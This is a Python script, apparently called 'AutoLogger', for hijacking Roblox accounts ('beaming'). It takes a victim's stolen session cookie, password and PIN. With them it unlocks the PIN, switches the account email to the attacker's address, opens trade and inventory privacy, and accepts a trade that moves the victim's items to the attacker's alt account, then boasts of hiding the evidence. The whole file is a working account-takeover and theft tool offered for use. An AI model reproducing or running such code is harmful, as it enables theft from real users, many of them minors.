from os import system
from tkinter import E
from turtle import color
import requests
import colorama
import time
import json
import pwinput
from colorama import Fore, Back, Style
from colorama import init
import pystyle 
from pystyle import Colors, Colorate, Box, Write, Center
import requests
from requests.structures import CaseInsensitiveDict
init(autoreset=True)

banner = '''
    _       _       _                        
   /_\ _  _| |_ ___| |___  __ _ __ _ ___ _ _ 
  / _ \ || |  _/ _ \ / _ \/ _` / _` / -_) '_|
 /_/ \_\_,_|\__\___/_\___/\__, \__, \___|_|  
                          |___/|___/         
'''
print(Center.XCenter("AutoLogger by cow#3479"))
Write.Print(banner, Colors.blue_to_cyan, interval=0.000025)
print("")
print("") 
altc = Write.Input("Enter your alt cookie -> ", Colors.blue_to_cyan, interval=0.0025)
url = "https://www.roblox.com/mobileapi/userinfo"
headers = CaseInsensitiveDict()
headers["Cookie"] = ".ROBLOSECURITY=" + altc
resp = requests.get(url, headers=headers)
api1 = open("user.json", "w") 
api1.write(resp.text) 
api1.close()  
file_path = 'user.json' 
with open(file_path) as file:
    x1 = file.read()
x =  x1
y = json.loads(x)
user1 = y["UserName"]
robux1 = y["RobuxBalance"]
perm1 = y["IsPremium"]
userid = y["UserID"]
Write.Print(f"Nice to meet you,{user1}!", Colors.blue_to_cyan, interval=0.0025)
print("") 
Write.Print(f"Logged In to {user1}", Colors.green_to_white, interval=0.0025)
print("")
print("")
print("")
print(Box.DoubleCube(f"Account Info Before Log:\n"+f"Robux:{robux1}\n"+f"Premium:{perm1}\n"))
print("") 
print("") 
rgmail = input("Enter your replacement gmail address -> ")
print("") 
tcookie = input("Enter your target cookie -> ") 
tpass = input("Enter your target password -> ") 
tpin = input("Enter your target pin -> ",) 
print("") 
print("") 
print("") 
try: 
    url = 'https://auth.roblox.com/v1/account/pin/unlock'
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":tcookie})
    xcrsf = (token.headers['x-csrf-token']) 
    header = {'X-CSRF-TOKEN': xcrsf} 
    payload = {'pin': tpin} 
    r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":tcookie})
    print("") 
    Write.Print("Unlocked PIN\n", Colors.green_to_white, interval=0.0025) 
except: 
  Write.Print("Could not unlock PIN\n", Colors.red_to_white, interval=0.0025),input("")
with requests.session() as session: 
            session.cookies['.ROBLOSECURITY'] = tcookie 
            session.headers['x-csrf-token'] = xcrsf
            s = session.post('https://accountsettings.roblox.com/v1/email', data={'password':tpass, 'emailAddress':rgmail, 'skipVerificationEmail':False})#Change Email Address
with requests.session() as session: 
            session.cookies['.ROBLOSECURITY'] = tcookie
            session.headers['x-csrf-token'] = xcrsf
            s = session.post('https://accountsettings.roblox.com/v1/email/verify\n')
print("")
Write.Print("Changed Email Address Please Confirm  New Email Address [You Have 20 seconds to Verify]\n", Colors.green_to_white, interval=0.0025) 
def countdown(t):  
    while t:
        mins, secs = divmod(t, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r") 
        time.sleep(1) 
        t -= 1 
t = 20
countdown(int(t))
with requests.session() as session: 
            session.cookies['.ROBLOSECURITY'] = tcookie
            session.headers['x-csrf-token'] = xcrsf
            s = session.post('https://accountsettings.roblox.com/v1/inventory-privacy', data={'inventoryPrivacy':"AllUsers"})
print("") 
Write.Print("Updated Users Inventory privacy\n", Colors.green_to_white, interval=0.0025)
with requests.session() as session: 
            session.cookies['.ROBLOSECURITY'] = tcookie 
            session.headers['x-csrf-token'] = xcrsf
            s = session.post('https://accountsettings.roblox.com/v1/trade-privacy', data={'tradePrivacy':"All"})
print("") 
Write.Print("Updated Users Trade privacy\n", Colors.green_to_white, interval=0.0025) 
with requests.session() as session: 
            session.cookies['.ROBLOSECURITY'] = tcookie 
            session.headers['x-csrf-token'] = xcrsf  
            s = session.post('https://accountsettings.roblox.com/v1/trade-value', data={'tradeValue':"Low"})  
print("") 
Write.Print("Updated Users Trade Filter\n", Colors.green_to_white, interval=0.0025)
print("") 
print("") 
Write.Print("Waiting Please Send Trade To Target Account\n", Colors.green_to_white, interval=0.0025)
def countdown(t):  
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        print(timer, end="\r") 
        time.sleep(1)
        t -= 1 
t = 30 
countdown(int(t))
print("") 
url = "https://trades.roblox.com/v1/trades/OutBound?sortOrder=Asc&limit=10" 
headers = CaseInsensitiveDict() 
headers["Cookie"] = f".ROBLOSECURITY={altc}"
headers["Accept"] = "application/json"
headers["Content-Length"] = "0" 
resp = requests.get(url, headers=headers) 
print(resp.text) 
print("") 
Write.Print("Find Trade ID above\n", Colors.green_to_white, interval=0.0025)
ttid = Write.Input("Enter The Trade ID -> ", Colors.blue_to_cyan, interval=0.0025)
try: 
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":{tcookie}})
    xcrsf = (token.headers['x-csrf-token']) 
    url = f"https://trades.roblox.com/v1/trades/{ttid}/accept"
    headers = CaseInsensitiveDict()
    headers["Cookie"] = f".ROBLOSECURITY={tcookie}" 
    headers["Accept"] = "application/json" 
    headers["Content-Length"] = "0" 
    headers["X-CSRF-TOKEN"] = xcrsf 
    resp = requests.post(url, headers=headers) 
    Write.Print("Succesfully Accepted Trade\n", Colors.green_to_white, interval=0.0025)
except: 
    Write.Print("Could not Accept Trade\n", Colors.red_to_white, interval=0.0025)
print("") 
Write.Print("Hid Beaming Evidence!\n", Colors.green_to_white, interval=0.0025)
print("") 
Write.Print("Extra Options\n[1]get target info\n", Colors.green_to_white, interval=0.0025)
exta = Write.Input("-> ", Colors.blue_to_cyan, interval=0.0025)
print("") 
if exta =="1": 
    url = "https://www.roblox.com/mobileapi/userinfo"
    headers = CaseInsensitiveDict() 
    headers["Cookie"] = ".ROBLOSECURITY=" + tcookie
    resp = requests.get(url, headers=headers)  
    api1 = open("target.json", "w") 
    api1.write(resp.text) 
    api1.close()  
    file_path = 'user.json'
    with open(file_path) as file: 
        x1 = file.read()  
    x =  x1
    y = json.loads(x)
    user1 = y["UserName"] 
    robux1 = y["RobuxBalance"] 
    perm1 = y["IsPremium"] 
    userid = y["UserID"] 
    Write.Print(f"{user1} Account Info:\n"+f"Robux:{robux1}\n"+f"Premium:{perm1}\n",Colors.green_to_white, interval=0.0025)
    print("")
    print("") 
    Write.Print("Done\n", Colors.green_to_white, interval=0.0025)
input("") 
